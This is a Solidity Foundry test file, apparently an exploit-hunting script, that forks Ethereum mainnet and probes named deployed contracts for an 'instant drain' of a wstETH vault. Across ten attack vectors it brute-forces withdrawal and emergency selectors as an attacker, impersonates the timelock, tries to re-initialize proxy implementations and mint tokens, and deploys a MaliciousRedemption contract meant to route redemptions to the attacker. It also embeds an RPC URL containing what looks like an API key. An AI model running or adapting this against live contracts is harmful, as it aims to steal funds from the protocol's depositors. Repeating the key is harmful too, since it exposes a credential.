// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function totalSupply() external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
}

interface IVault {
    function withdraw(address token, uint256 amount) external;
    function transfer(address token, address to, uint256 amount) external;
}

/**
 * IMMEDIATE EXPLOIT BRAINSTORM
 * Testing every possible pathway for instant drain
 */
contract ImmediateExploitBrainstorm is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;
    address constant IAU = 0x1B6238E95bBCABEE58997c99BaDD4154ad68BA92;
    address constant stETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    // ============ ATTACK VECTOR 1: RATE MANIPULATION ============
    function test_RateManipulationAttack() public {
        console.log("=== RATE MANIPULATION ATTACK ===\n");

        // Check what rate/conversion is used
        // R0 might use wstETH/stETH rate or similar

        // Find rate-related functions
        bytes4[] memory rateSels = new bytes4[](10);
        rateSels[0] = bytes4(keccak256("getRate()"));
        rateSels[1] = bytes4(keccak256("exchangeRate()"));
        rateSels[2] = bytes4(keccak256("rate()"));
        rateSels[3] = bytes4(keccak256("convertToAssets(uint256)"));
        rateSels[4] = bytes4(keccak256("convertToShares(uint256)"));
        rateSels[5] = bytes4(keccak256("previewRedeem(uint256)"));
        rateSels[6] = bytes4(keccak256("previewWithdraw(uint256)"));
        rateSels[7] = bytes4(keccak256("assetsPerShare()"));
        rateSels[8] = bytes4(keccak256("totalAssets()"));
        rateSels[9] = bytes4(keccak256("oracle()"));

        console.log("Checking R0 for rate functions:");
        for (uint i = 0; i < rateSels.length; i++) {
            (bool s, bytes memory d) = REDEMPTION_0.staticcall(
                abi.encodeWithSelector(rateSels[i], 1e18)
            );
            if (s && d.length >= 32) {
                console.log("Found rate function:");
                console.logBytes4(rateSels[i]);
                console.log("  Value:", abi.decode(d, (uint256)));
            }
        }

        // Check wstETH rate
        (bool ws, bytes memory wd) = wstETH.staticcall(
            abi.encodeWithSignature("stEthPerToken()")
        );
        if (ws && wd.length >= 32) {
            console.log("\nwstETH stEthPerToken:", abi.decode(wd, (uint256)));
        }

        (bool ws2, bytes memory wd2) = wstETH.staticcall(
            abi.encodeWithSignature("tokensPerStEth()")
        );
        if (ws2 && wd2.length >= 32) {
            console.log("wstETH tokensPerStEth:", abi.decode(wd2, (uint256)));
        }
    }

    // ============ ATTACK VECTOR 2: MULTIPLE REDEMPTION TIMING ============
    function test_MultipleRedemptionTiming() public {
        console.log("=== MULTIPLE REDEMPTION TIMING ===\n");

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        // Create multiple redemptions quickly
        console.log("Creating multiple redemptions...");

        for (uint i = 0; i < 3; i++) {
            (bool s,) = REDEMPTION_0.call(
                abi.encodeWithSignature("redeem(uint96)", uint96(1000e18))
            );
            console.log("Redemption", i, ":", s);
        }

        // Check how many we have
        (bool ls, bytes memory ld) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("getRedeemLength(address)", attacker)
        );
        if (ls) {
            console.log("Total redemptions:", abi.decode(ld, (uint256)));
        }

        // Try finalizing with different indices BEFORE time passes
        console.log("\nTrying immediate finalize with different indices:");
        for (uint i = 0; i < 5; i++) {
            (bool fs,) = REDEMPTION_0.call(
                abi.encodeWithSignature("finalizeRedeem(uint256)", i)
            );
            if (fs) {
                console.log("*** INDEX", i, "FINALIZED IMMEDIATELY! ***");
            }
        }

        vm.stopPrank();
    }

    // ============ ATTACK VECTOR 3: R0/R1 CROSS-CONTRACT ============
    function test_CrossContractExploit() public {
        console.log("=== R0/R1 CROSS-CONTRACT EXPLOIT ===\n");

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);
        IERC20(TASSET).approve(REDEMPTION_1, type(uint256).max);

        // Create redemption on R0
        REDEMPTION_0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        // Try to finalize via R1 (cross-contract)
        console.log("Try finalize R0 redemption via R1:");
        (bool s1,) = REDEMPTION_1.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("R1 finalize:", s1);

        // Create on R1, finalize on R0
        REDEMPTION_1.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        console.log("Try finalize R1 redemption via R0:");
        (bool s2,) = REDEMPTION_0.call(
            abi.encodeWithSignature("finalizeRedeem(uint256)", 0)
        );
        console.log("R0 finalize:", s2);

        vm.stopPrank();

        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
        console.log("Attacker wstETH:", attackerBal / 1e18);
    }

    // ============ ATTACK VECTOR 4: PAUSE/EMERGENCY STATE ============
    function test_PauseStateExploit() public {
        console.log("=== PAUSE/EMERGENCY STATE EXPLOIT ===\n");

        // Check pause status
        (bool ps, bytes memory pd) = REDEMPTION_CONTROLLER.staticcall(
            abi.encodeWithSignature("paused()")
        );
        if (ps) {
            console.log("RC paused:", abi.decode(pd, (bool)));
        }

        (bool ps0, bytes memory pd0) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("paused()")
        );
        if (ps0) {
            console.log("R0 paused:", abi.decode(pd0, (bool)));
        }

        // Check for emergency functions
        console.log("\nChecking emergency functions:");
        bytes4[] memory emergSels = new bytes4[](10);
        emergSels[0] = bytes4(keccak256("emergencyWithdraw()"));
        emergSels[1] = bytes4(keccak256("emergencyWithdraw(uint256)"));
        emergSels[2] = bytes4(keccak256("emergencyRedeem(uint256)"));
        emergSels[3] = bytes4(keccak256("rescue(address,uint256)"));
        emergSels[4] = bytes4(keccak256("rescueTokens(address,uint256)"));
        emergSels[5] = bytes4(keccak256("sweep(address)"));
        emergSels[6] = bytes4(keccak256("recover(address,uint256)"));
        emergSels[7] = bytes4(keccak256("emergencyExit()"));
        emergSels[8] = bytes4(keccak256("pause()"));
        emergSels[9] = bytes4(keccak256("unpause()"));

        vm.startPrank(attacker);
        for (uint i = 0; i < emergSels.length; i++) {
            (bool s,) = REDEMPTION_0.call{gas: 200000}(
                abi.encodeWithSelector(emergSels[i], wstETH, 1000e18)
            );
            if (s) {
                console.log("Emergency function works:");
                console.logBytes4(emergSels[i]);
            }
        }
        vm.stopPrank();
    }

    // ============ ATTACK VECTOR 5: TASSET MANIPULATION ============
    function test_TassetManipulation() public {
        console.log("=== TASSET MANIPULATION ===\n");

        console.log("TASSET address:", TASSET);
        console.log("TASSET supply:", IERC20(TASSET).totalSupply() / 1e18);

        // Check TASSET functions
        bytes4[] memory tassetSels = new bytes4[](15);
        tassetSels[0] = bytes4(keccak256("mint(address,uint256)"));
        tassetSels[1] = bytes4(keccak256("burn(uint256)"));
        tassetSels[2] = bytes4(keccak256("burnFrom(address,uint256)"));
        tassetSels[3] = bytes4(keccak256("owner()"));
        tassetSels[4] = bytes4(keccak256("minter()"));
        tassetSels[5] = bytes4(keccak256("deposit(uint256)"));
        tassetSels[6] = bytes4(keccak256("withdraw(uint256)"));
        tassetSels[7] = bytes4(keccak256("redeem(uint256)"));
        tassetSels[8] = bytes4(keccak256("underlying()"));
        tassetSels[9] = bytes4(keccak256("asset()"));
        tassetSels[10] = bytes4(keccak256("totalAssets()"));
        tassetSels[11] = bytes4(keccak256("convertToShares(uint256)"));
        tassetSels[12] = bytes4(keccak256("convertToAssets(uint256)"));
        tassetSels[13] = bytes4(keccak256("maxDeposit(address)"));
        tassetSels[14] = bytes4(keccak256("maxMint(address)"));

        console.log("TASSET view functions:");
        for (uint i = 0; i < tassetSels.length; i++) {
            (bool s, bytes memory d) = TASSET.staticcall(
                abi.encodeWithSelector(tassetSels[i], attacker)
            );
            if (s && d.length >= 32) {
                console.logBytes4(tassetSels[i]);
                uint256 val = abi.decode(d, (uint256));
                if (val < type(uint160).max && val > 0x1000) {
                    console.log("  Address:", address(uint160(val)));
                } else {
                    console.log("  Value:", val);
                }
            }
        }

        // Can we mint TASSET directly?
        vm.startPrank(attacker);
        console.log("\nTrying to mint TASSET:");
        (bool ms,) = TASSET.call(
            abi.encodeWithSignature("mint(address,uint256)", attacker, 1000000e18)
        );
        console.log("Mint success:", ms);

        uint256 bal = IERC20(TASSET).balanceOf(attacker);
        console.log("Attacker TASSET:", bal / 1e18);
        vm.stopPrank();
    }

    // ============ ATTACK VECTOR 6: VAULT DIRECT ACCESS ============
    function test_VaultDirectAccess() public {
        console.log("=== VAULT DIRECT ACCESS ===\n");

        uint256 vaultBal = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault wstETH:", vaultBal / 1e18);

        // Check Vault code for all functions
        bytes memory vaultCode = VAULT.code;
        console.log("Vault code size:", vaultCode.length);

        // Find all selectors in Vault
        console.log("\nVault selectors:");
        for (uint i = 0; i + 4 < 300 && i < vaultCode.length; i++) {
            if (uint8(vaultCode[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(vaultCode[i+1], vaultCode[i+2], vaultCode[i+3], vaultCode[i+4]));
                bool isSelector = false;
                for (uint j = i + 5; j < i + 15 && j < vaultCode.length; j++) {
                    if (uint8(vaultCode[j]) == 0x14) {
                        isSelector = true;
                        break;
                    }
                }
                if (isSelector && sel != bytes4(0) && uint32(sel) > 0x1000) {
                    console.logBytes4(sel);
                }
            }
        }

        // Try calling Vault functions as attacker
        vm.startPrank(attacker);

        bytes4[] memory vaultSels = new bytes4[](20);
        vaultSels[0] = bytes4(keccak256("withdraw(address,uint256)"));
        vaultSels[1] = bytes4(keccak256("transfer(address,address,uint256)"));
        vaultSels[2] = bytes4(keccak256("transferToken(address,address,uint256)"));
        vaultSels[3] = bytes4(keccak256("sendToken(address,address,uint256)"));
        vaultSels[4] = bytes4(keccak256("execute(address,uint256,bytes)"));
        vaultSels[5] = bytes4(keccak256("call(address,bytes)"));
        vaultSels[6] = bytes4(keccak256("delegatecall(address,bytes)"));
        vaultSels[7] = bytes4(keccak256("sweep(address,address)"));
        vaultSels[8] = bytes4(keccak256("rescueTokens(address,address,uint256)"));
        vaultSels[9] = bytes4(keccak256("emergencyWithdraw(address,uint256)"));
        vaultSels[10] = bytes4(keccak256("setRedemptionController(address)"));
        vaultSels[11] = bytes4(keccak256("setAuthorized(address,bool)"));
        vaultSels[12] = bytes4(keccak256("addAuthorized(address)"));
        vaultSels[13] = bytes4(keccak256("whitelist(address)"));
        vaultSels[14] = bytes4(keccak256("authorize(address)"));

        console.log("\nTrying Vault functions:");
        for (uint i = 0; i < 15; i++) {
            (bool s,) = VAULT.call{gas: 200000}(
                abi.encodeWithSelector(vaultSels[i], wstETH, attacker, vaultBal)
            );
            if (s) {
                console.log("SUCCESS:");
                console.logBytes4(vaultSels[i]);
            }
        }

        vm.stopPrank();

        uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
        if (attackerBal > 0) {
            console.log("\n*** VAULT DIRECT DRAIN! ***");
            console.log("Attacker got:", attackerBal / 1e18, "wstETH");
        }
    }

    // ============ ATTACK VECTOR 7: RC REGISTRATION BYPASS ============
    function test_RCRegistrationBypass() public {
        console.log("=== RC REGISTRATION BYPASS ===\n");

        // Can we register our own contract as a redemption?
        MaliciousRedemption malicious = new MaliciousRedemption(attacker);
        console.log("Malicious redemption:", address(malicious));

        // Check if already registered somehow
        bytes32 regKey = keccak256(abi.encode(address(malicious), uint256(4)));
        bytes32 regVal = vm.load(REDEMPTION_CONTROLLER, regKey);
        console.log("Registration before:", uint256(regVal));

        // Try to register
        vm.startPrank(attacker);
        (bool s1,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("addRedemption(address)", address(malicious))
        );
        console.log("addRedemption as attacker:", s1);
        vm.stopPrank();

        // Try as timelock
        vm.startPrank(TIMELOCK);
        (bool s2,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("addRedemption(address)", address(malicious))
        );
        console.log("addRedemption as timelock:", s2);
        vm.stopPrank();

        // Check if registered now
        regVal = vm.load(REDEMPTION_CONTROLLER, regKey);
        console.log("Registration after:", uint256(regVal));

        if (uint256(regVal) > 0) {
            console.log("\n*** REGISTERED! Attempting drain... ***");

            uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
            malicious.drain(1000e18);

            uint256 attackerBal = IERC20(wstETH).balanceOf(attacker);
            console.log("Attacker wstETH:", attackerBal / 1e18);
        }
    }

    // ============ ATTACK VECTOR 8: INITIALIZATION ATTACKS ============
    function test_InitializationAttacks() public {
        console.log("=== INITIALIZATION ATTACKS ===\n");

        // Check if any contract can be re-initialized

        // Check R0 implementation
        bytes32 r0ImplSlot = vm.load(REDEMPTION_0, bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1));
        address r0Impl = address(uint160(uint256(r0ImplSlot)));
        console.log("R0 implementation:", r0Impl);

        if (r0Impl != address(0) && r0Impl.code.length > 0) {
            console.log("R0 impl code size:", r0Impl.code.length);

            // Try to initialize the implementation directly
            vm.startPrank(attacker);
            (bool s1,) = r0Impl.call(
                abi.encodeWithSignature("initialize(address)", attacker)
            );
            console.log("Initialize R0 impl:", s1);

            (bool s2,) = r0Impl.call(
                abi.encodeWithSignature("init(address)", attacker)
            );
            console.log("Init R0 impl:", s2);
            vm.stopPrank();
        }

        // Check R1 implementation (slot 5)
        bytes32 r1ImplSlot = vm.load(REDEMPTION_1, bytes32(uint256(5)));
        address r1Impl = address(uint160(uint256(r1ImplSlot)));
        console.log("\nR1 implementation at slot 5:", r1Impl);

        if (r1Impl != address(0) && r1Impl.code.length > 0) {
            console.log("R1 impl code size:", r1Impl.code.length);

            vm.startPrank(attacker);
            (bool s3,) = r1Impl.call(
                abi.encodeWithSignature("initialize(address)", attacker)
            );
            console.log("Initialize R1 impl:", s3);
            vm.stopPrank();
        }

        // Check RC for initialization
        console.log("\nChecking RC initialization:");
        vm.startPrank(attacker);
        (bool s4,) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("initialize(address,address)", attacker, VAULT)
        );
        console.log("Initialize RC:", s4);
        vm.stopPrank();
    }

    // ============ ATTACK VECTOR 9: INTEGER/ROUNDING ATTACKS ============
    function test_IntegerRoundingAttacks() public {
        console.log("=== INTEGER/ROUNDING ATTACKS ===\n");

        deal(TASSET, attacker, 10e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(REDEMPTION_0, type(uint256).max);

        // Try with tiny amounts
        console.log("Testing tiny amounts:");
        uint96[] memory amounts = new uint96[](5);
        amounts[0] = 1; // 1 wei
        amounts[1] = 100;
        amounts[2] = 1000;
        amounts[3] = 1e9; // 1 gwei equivalent
        amounts[4] = 1e15; // 0.001 token

        for (uint i = 0; i < amounts.length; i++) {
            (bool s,) = REDEMPTION_0.call(
                abi.encodeWithSignature("redeem(uint96)", amounts[i])
            );
            if (s) {
                console.log("Amount", amounts[i], "accepted");
            }
        }

        // Try with max amounts
        console.log("\nTesting large amounts:");
        (bool sMax,) = REDEMPTION_0.call(
            abi.encodeWithSignature("redeem(uint96)", type(uint96).max)
        );
        console.log("Max uint96:", sMax);

        vm.stopPrank();

        // Check if any rounding in conversion
        console.log("\nConversion rates:");
        (bool cs, bytes memory cd) = REDEMPTION_0.staticcall(
            abi.encodeWithSignature("previewRedeem(uint256)", 1e18)
        );
        if (cs && cd.length >= 32) {
            console.log("1 TASSET -> wstETH:", abi.decode(cd, (uint256)));
        }
    }

    // ============ ATTACK VECTOR 10: IAU CONTRACT DEEP ============
    function test_IAUContractDeep() public {
        console.log("=== IAU CONTRACT DEEP INVESTIGATION ===\n");

        console.log("IAU address:", IAU);
        console.log("IAU code size:", IAU.code.length);

        // Comprehensive IAU function scan
        bytes4[] memory iauSels = new bytes4[](30);
        iauSels[0] = bytes4(keccak256("deposit(uint256)"));
        iauSels[1] = bytes4(keccak256("withdraw(uint256)"));
        iauSels[2] = bytes4(keccak256("redeem(uint256)"));
        iauSels[3] = bytes4(keccak256("mint(uint256)"));
        iauSels[4] = bytes4(keccak256("claim()"));
        iauSels[5] = bytes4(keccak256("claimRewards()"));
        iauSels[6] = bytes4(keccak256("harvest()"));
        iauSels[7] = bytes4(keccak256("compound()"));
        iauSels[8] = bytes4(keccak256("stake(uint256)"));
        iauSels[9] = bytes4(keccak256("unstake(uint256)"));
        iauSels[10] = bytes4(keccak256("getReward()"));
        iauSels[11] = bytes4(keccak256("exit()"));
        iauSels[12] = bytes4(keccak256("totalAssets()"));
        iauSels[13] = bytes4(keccak256("asset()"));
        iauSels[14] = bytes4(keccak256("owner()"));
        iauSels[15] = bytes4(keccak256("balanceOf(address)"));
        iauSels[16] = bytes4(keccak256("earned(address)"));
        iauSels[17] = bytes4(keccak256("rewardRate()"));
        iauSels[18] = bytes4(keccak256("periodFinish()"));
        iauSels[19] = bytes4(keccak256("rewardToken()"));

        console.log("IAU functions:");
        for (uint i = 0; i < 20; i++) {
            (bool s, bytes memory d) = IAU.staticcall(
                abi.encodeWithSelector(iauSels[i], attacker)
            );
            if (s && d.length >= 32) {
                console.logBytes4(iauSels[i]);
                uint256 val = abi.decode(d, (uint256));
                console.log("  ", val);
            }
        }

        // Check if IAU can interact with RC/Vault
        console.log("\nIAU storage:");
        for (uint i = 0; i < 15; i++) {
            bytes32 slot = vm.load(IAU, bytes32(i));
            if (slot != bytes32(0)) {
                address addr = address(uint160(uint256(slot)));
                if (addr == VAULT || addr == REDEMPTION_CONTROLLER || addr == REDEMPTION_0) {
                    console.log("Slot", i, "contains protocol address:");
                    console.log("  ", addr);
                }
            }
        }

        // Try IAU functions as attacker
        vm.startPrank(attacker);
        deal(wstETH, attacker, 100e18);
        IERC20(wstETH).approve(IAU, type(uint256).max);

        console.log("\nTrying IAU state-changing functions:");
        (bool s1,) = IAU.call(abi.encodeWithSignature("deposit(uint256)", 10e18));
        console.log("IAU deposit:", s1);

        (bool s2,) = IAU.call(abi.encodeWithSignature("withdraw(uint256)", 100e18));
        console.log("IAU withdraw:", s2);

        vm.stopPrank();
    }
}

contract MaliciousRedemption {
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address public recipient;

    constructor(address _recipient) {
        recipient = _recipient;
    }

    function drain(uint256 amount) external {
        RC.call(abi.encodeWithSignature("redeem(uint256,address)", amount, recipient));
    }

    // Might need to implement expected interface
    function finalizeRedeem(uint256) external {
        RC.call(abi.encodeWithSignature("redeem(uint256,address)", 1000e18, recipient));
    }
}
